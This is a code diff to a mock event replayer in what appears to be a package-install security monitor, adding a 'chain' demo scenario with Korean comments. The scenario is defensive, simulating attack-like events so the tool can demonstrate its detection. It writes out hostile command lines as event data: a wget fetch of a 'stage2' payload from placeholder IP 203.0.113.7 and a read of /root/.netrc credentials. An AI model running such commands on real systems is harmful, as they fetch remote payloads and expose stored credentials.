@@ -198,12 +198,26 @@ var demoScenarios = map[string][]model.Event{
 	},
 	"dns-exfil": dnsExfil,
 	"benign":    nil, // 정상 설치 대조군(11/04) — 세션 패키지(./sg-demo-benign)의 pip 정상 설치 이벤트만
+	// 연쇄 규칙 시연(11/04) — busybox 셸 본문(demo.ChainScript)이 내는 순서: wget 실행 → TEST-NET :80 직접 연결 → 1초 뒤 없는 /root/.netrc 열기 시도
+	"chain": {
+		{Kind: model.KindExec, Comm: "timeout", Args: "timeout 3 wget -q -O /dev/null http://203.0.113.7/stage2"},
+		{Kind: model.KindExec, Comm: "wget", Args: "wget -q -O /dev/null http://203.0.113.7/stage2"},
+		{Kind: model.KindConnect, Comm: "wget", DstIP: "203.0.113.7", DstPort: 80},
+		{Kind: model.KindExec, Comm: "sleep", Args: "sleep 1"},
+		{Kind: model.KindExec, Comm: "cat", Args: "cat /root/.netrc"},
+		{Kind: model.KindOpen, Comm: "cat", Path: "/root/.netrc"},
+	},
+}
+
+// chainPrelude: chain 시연은 pip 설치가 없다 — 컨테이너 PID1(sh -c 본문) 실행만 앞에 둔다
+var chainPrelude = []model.Event{
+	{Kind: model.KindExec, Comm: "sh", Args: "sh -c echo \"[demo] chain start\"; timeout 3 wget -q -O /dev/null http://203.0.113.7/stage2 || true; sleep 1; cat /root/.netrc >/dev/null 2>&1 || true"},
 }
 
 // demoOrder: all 의 순서
 var demoOrder = []string{"shell", "revshell", "direct-ip", "domain", "dns-exfil"}
 
-// PlayDemo: 시연 세션(10/30)을 컨테이너 없이 재생한다 — 시작 → pip 설치 정상 이벤트(세션의 패키지) → 시나리오 이벤트를 한 건씩(실제처럼 첫 kill 에서 멈춘다) → 종료.
+// PlayDemo: 시연 세션(10/30)을 컨테이너 없이 재생한다 — 시작 → pip 설치 정상 이벤트(세션의 패키지, chain 은 셸 실행) → 시나리오 이벤트를 한 건씩(실제처럼 첫 kill 에서 멈춘다) → 종료.
 // 끝날 때까지 막히고, 격리(kill)로 끝났으면 true. 소스가 아직 돌지 않으면 바로 false
 func (m *Mock) PlayDemo(ctx context.Context, s model.InstallSession, scenario string) bool {
 	c, out := m.installContainer(s)
@@ -211,6 +225,9 @@ func (m *Mock) PlayDemo(ctx context.Context, s model.InstallSession, scenario st
 		return false
 	}
 	steps, _ := installScript("pip", s.Packages)
+	if scenario == "chain" {
+		steps = chainPrelude
+	}
 	names := []string{scenario}
 	if scenario == "all" {
 		names = demoOrder
